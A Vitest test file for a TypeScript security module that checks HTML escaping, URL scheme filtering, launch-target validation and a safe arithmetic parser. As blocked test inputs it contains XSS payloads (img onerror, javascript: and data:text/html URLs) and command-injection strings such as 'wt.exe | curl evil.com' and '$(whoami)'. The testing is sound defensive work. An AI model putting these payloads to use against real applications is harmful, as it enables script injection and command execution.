import { describe, expect, it } from 'vitest';
import {
  escapeAttr,
  escapeHtml,
  isSafeLaunchTarget,
  safeEvaluateMath,
  sanitizeUrl,
} from '../security';

describe('security.ts — XSS escaping & URL/Target sanitization', () => {
  it('escapes HTML special characters in escapeHtml and escapeAttr', () => {
    const payload = `X - <img src=x onerror="alert('xss')"> & 'quotes'`;
    const escaped = escapeHtml(payload);
    expect(escaped).toBe(
      'X - &lt;img src=x onerror=&quot;alert(&#39;xss&#39;)&quot;&gt; &amp; &#39;quotes&#39;'
    );
    expect(escapeAttr(payload)).toBe(escaped);
  });

  it('allows safe https, http, spotify, ms-settings, and base64 PNG data URLs in sanitizeUrl', () => {
    expect(sanitizeUrl('https://github.com/oprimo')).toBe('https://github.com/oprimo');
    expect(sanitizeUrl('http://localhost:5175/')).toBe('http://localhost:5175/');
    expect(sanitizeUrl('spotify:track:123')).toBe('spotify:track:123');
    expect(sanitizeUrl('ms-settings:display')).toBe('ms-settings:display');
    expect(sanitizeUrl('data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==')).toBe(
      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg=='
    );
    expect(sanitizeUrl('data:image/jpeg;base64,/9j/4AAQSkZJRg==')).toBe(
      'data:image/jpeg;base64,/9j/4AAQSkZJRg=='
    );
    expect(sanitizeUrl('data:image/webp;base64,UklGRg==')).toBe(
      'data:image/webp;base64,UklGRg=='
    );
  });

  it('blocks dangerous schemes and malformed data URLs in sanitizeUrl', () => {
    expect(sanitizeUrl('javascript:alert(1)')).toBe('');
    expect(sanitizeUrl('JAVASCRIPT:evil()')).toBe('');
    expect(sanitizeUrl('vbscript:msgbox(1)')).toBe('');
    expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
    expect(sanitizeUrl('data:image/png;base64,not_valid_base64"><script>')).toBe('');
    expect(sanitizeUrl('')).toBe('');
  });

  it('validates launch targets, allows & in http(s) query strings, and blocks shell metacharacters in commands', () => {
    expect(isSafeLaunchTarget('wt.exe')).toBe(true);
    expect(isSafeLaunchTarget('explorer.exe')).toBe(true);
    expect(isSafeLaunchTarget('https://meet.google.com')).toBe(true);
    expect(isSafeLaunchTarget('https://meet.google.com/abc-defg-hij?authuser=0&pli=1')).toBe(true);
    expect(isSafeLaunchTarget('https://zoom.us/j/123456?pwd=xyz&uname=dev')).toBe(true);
    expect(isSafeLaunchTarget('shell:RecycleBinFolder')).toBe(true);
    expect(isSafeLaunchTarget('__START_MENU__')).toBe(true);

    // Block command injection metacharacters on executables
    expect(isSafeLaunchTarget('calc.exe & whoami')).toBe(false);
    expect(isSafeLaunchTarget('wt.exe | curl evil.com')).toBe(false);
    expect(isSafeLaunchTarget('notepad.exe; calc.exe')).toBe(false);
    expect(isSafeLaunchTarget('cmd > out.txt')).toBe(false);
    expect(isSafeLaunchTarget('`id`')).toBe(false);
    expect(isSafeLaunchTarget('$(whoami)')).toBe(false);
    expect(isSafeLaunchTarget('javascript:alert(1)')).toBe(false);
  });
});

describe('security.ts — safeEvaluateMath (CSP-safe recursive descent parser)', () => {
  it('evaluates basic arithmetic with proper operator precedence', () => {
    expect(safeEvaluateMath('2 + 3 * 4')).toBe(14);
    expect(safeEvaluateMath('(2 + 3) * 4')).toBe(20);
    expect(safeEvaluateMath('100 / 4 - 5')).toBe(20);
    expect(safeEvaluateMath('10 % 3')).toBe(1);
  });

  it('supports unary signs, decimals, and comma decimal separators', () => {
    expect(safeEvaluateMath('-5 + 12')).toBe(7);
    expect(safeEvaluateMath('12,5 * 2')).toBe(25);
    expect(safeEvaluateMath('+(3.5 + 1.5)')).toBe(5);
  });

  it('returns null for division by zero, non-math strings, or malicious input', () => {
    expect(safeEvaluateMath('10 / 0')).toBeNull();
    expect(safeEvaluateMath('alert(1)')).toBeNull();
    expect(safeEvaluateMath('2 + ')).toBeNull();
    expect(safeEvaluateMath('((2 + 3)')).toBeNull();
    expect(safeEvaluateMath('42')).toBeNull(); // Must contain an operator to trigger calculator badge
  });
});
